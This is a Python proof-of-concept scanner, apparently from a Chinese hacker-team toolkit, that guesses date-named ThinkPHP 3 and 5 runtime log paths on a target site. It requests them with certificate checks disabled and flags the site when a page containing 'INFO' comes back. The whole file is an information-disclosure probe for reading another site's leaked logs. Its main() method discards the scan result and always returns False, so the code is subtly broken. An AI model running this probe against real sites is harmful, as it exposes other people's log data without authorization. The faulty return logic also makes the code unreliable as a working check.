'''
Function:
    thinkphp_log
Author:
    花果山
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import datetime


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.proxies = proxies

    def getTPLogFilename(self, version):
        now_year = datetime.datetime.now().year
        now_month = datetime.datetime.now().month
        now_day = datetime.datetime.now().day
        begin_date = datetime.date(now_year, now_month, 1)
        end_date = datetime.date(now_year, now_month, now_day)

        date_list = [begin_date + datetime.timedelta(days=i) for i in range((end_date - begin_date).days + 1)]
        filename_list = []
        for date in date_list:
            if version == 3:
                filename_list.append(
                    "{:0>2d}_{:0>2d}_{:0>2d}.log".format(int(str(date.year)[2:]), date.month, date.day))
            elif version == 5:
                filename_list.append("{}{:0>2d}/{:0>2d}.log".format(date.year, date.month, date.day))
        return filename_list

    def vuln(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
        }
        log_path_list = {
            '3': ['/Runtime/Logs/', '/App/Runtime/Logs/', '/Application/Runtime/Logs/Admin/',
                '/Application/Runtime/Logs/Home/', '/Application/Runtime/Logs/'],
            '5': ['/runtime/log/'],
        }

        for temppath in log_path_list['3']:
            filename_list = self.getTPLogFilename(3)
            for filename in filename_list:
                logpath = temppath + filename
                vulurl = "{}{}".format(self.url.rstrip('/'), logpath)
                try:
                    resp = requests.get(url=vulurl, headers=headers, proxies=self.proxies, timeout=3, verify=False)
                    if "INFO" in resp.text and resp.status_code == 200:
                        # print(vulurl)
                        return True
                except Exception as e:
                    pass

        for temppath in log_path_list['5']:
            filename_list = self.getTPLogFilename(5)
            for filename in filename_list:
                logpath = temppath + filename
                vulurl = "{}{}".format(
                    self.url.rstrip('/'), logpath)
                try:
                    resp = requests.get(url=vulurl, headers=headers, proxies=self.proxies, timeout=3, verify=False)
                    if "INFO" in resp.text and resp.status_code == 200:
                        # print(vulurl)
                        return True
                except Exception as e:
                    pass

    def main(self):
        self.vuln()
        return False


